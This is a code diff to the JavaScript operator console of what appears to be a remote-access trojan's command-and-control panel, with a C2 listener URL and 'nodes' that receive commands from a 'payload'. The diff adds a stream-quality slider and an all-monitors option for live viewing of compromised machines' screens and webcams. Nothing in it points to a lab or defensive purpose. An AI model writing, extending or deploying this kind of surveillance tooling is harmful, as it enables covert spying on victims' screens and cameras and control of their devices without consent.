@@ -18,6 +18,7 @@ let leafletMarkers = [];
 // --- Live View State ---
 let streamInterval = null;
 let activeStream = { type: null, monitor: 0 };
+let activeQuality = 30; // Stream Slider Default Value
 const STREAM_POLL_RATE = 250; 
 
 // --- Terminal & Filesystem State ---
@@ -150,6 +151,8 @@ async function fetchData() {
     btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Working';
 
     try {
+        console.log(`[+] Attempting connection to: ${C2_LISTENER_URL}/node/${deviceId}`);
+        
         const nodeResponse = await fetch(`${C2_LISTENER_URL}/node/${deviceId}`, {
             method: 'GET',
             headers: { 
@@ -408,9 +411,19 @@ async function sendCommandToNode(deviceId, command) {
 }
 
 // ==========================================
-// LIVE VIEW STREAMING (MULTI-MONITOR UPDATED)
+// LIVE VIEW STREAMING (MULTI-MONITOR + SLIDER)
 // ==========================================
-window.startStream = async function(type, monitorIndex = 0) {
+window.changeStreamQuality = function(val) {
+    activeQuality = parseInt(val);
+    document.getElementById('qualityLabel').innerText = `Q: ${activeQuality}`;
+    if (activeStream.type) {
+        // Send updated config to payload mid-stream dynamically
+        let streamTarget = activeStream.type === 'screen' ? `SCREEN_${activeStream.monitor}` : 'WEBCAM';
+        sendCommandToNode(activeNodeId, `START_STREAM:${streamTarget}|${activeQuality}`);
+    }
+};
+
+window.startStream = async function(type, monitorIndex = -1) {
     if (!activeNodeId) {
         return showToast("No active node selected!", "error");
     }
@@ -437,24 +450,37 @@ window.startStream = async function(type, monitorIndex = 0) {
 
     let streamTarget = type === 'screen' ? `SCREEN_${monitorIndex}` : 'WEBCAM';
 
+    // Slider UI injected inline
+    let sliderHtml = `
+        <div class="flex items-center gap-2 ml-4 border-l border-gray-700 pl-4">
+            <span class="text-[10px] text-gray-400 font-bold" title="High FPS, Low Quality"><i class="fa-solid fa-gauge-high"></i> FPS</span>
+            <input type="range" min="10" max="90" step="10" value="${activeQuality}" onchange="changeStreamQuality(this.value)" class="w-24 accent-cyberBlue cursor-pointer">
+            <span class="text-[10px] text-gray-400 font-bold" title="Low FPS, High Quality"><i class="fa-solid fa-image"></i> QUAL</span>
+            <span id="qualityLabel" class="text-[10px] text-cyberBlue font-mono ml-1">Q: ${activeQuality}</span>
+        </div>
+    `;
+
     if (type === 'screen') {
         title.innerHTML = `<i class="fa-solid fa-desktop text-cyberBlue mr-3"></i>Remote Screen: <span class="font-mono">${activeNodeId}</span>`;
-        // NEW: 4 Monitor Button Array
-        monitorControls.innerHTML = `
+        // -1 = All Screens. 0 = Mon 1. 1 = Mon 2. 2 = Mon 3.
+        let monButtons = `
+            <button onclick="startStream('screen', -1)" class="px-3 py-1 text-xs rounded ${monitorIndex === -1 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-700 text-gray-300'}">All</button>
             <button onclick="startStream('screen', 0)" class="px-3 py-1 text-xs rounded ${monitorIndex === 0 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-700 text-gray-300'}">Mon 1</button>
             <button onclick="startStream('screen', 1)" class="px-3 py-1 text-xs rounded ${monitorIndex === 1 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-700 text-gray-300'}">Mon 2</button>
             <button onclick="startStream('screen', 2)" class="px-3 py-1 text-xs rounded ${monitorIndex === 2 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-700 text-gray-300'}">Mon 3</button>
-            <button onclick="startStream('screen', 3)" class="px-3 py-1 text-xs rounded ${monitorIndex === 3 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-700 text-gray-300'}">Mon 4</button>
         `;
+        monitorControls.innerHTML = monButtons + sliderHtml;
         monitorControls.classList.remove('hidden');
     } else {
         title.innerHTML = `<i class="fa-solid fa-camera text-cyberBlue mr-3"></i>Webcam Feed: <span class="font-mono">${activeNodeId}</span>`;
-        monitorControls.classList.add('hidden');
+        monitorControls.innerHTML = sliderHtml;
+        monitorControls.classList.remove('hidden');
     }
 
-    termLog(`Initiating high-speed stream request for ${streamTarget}...`);
+    termLog(`Initiating stream for ${streamTarget} at Quality ${activeQuality}...`);
     
-    await sendCommandToNode(activeNodeId, `START_STREAM:${streamTarget}`);
+    // Pipe the target AND the quality value cleanly via the Issue route
+    await sendCommandToNode(activeNodeId, `START_STREAM:${streamTarget}|${activeQuality}`);
     streamInterval = setInterval(fetchFrame, STREAM_POLL_RATE);
 };
 
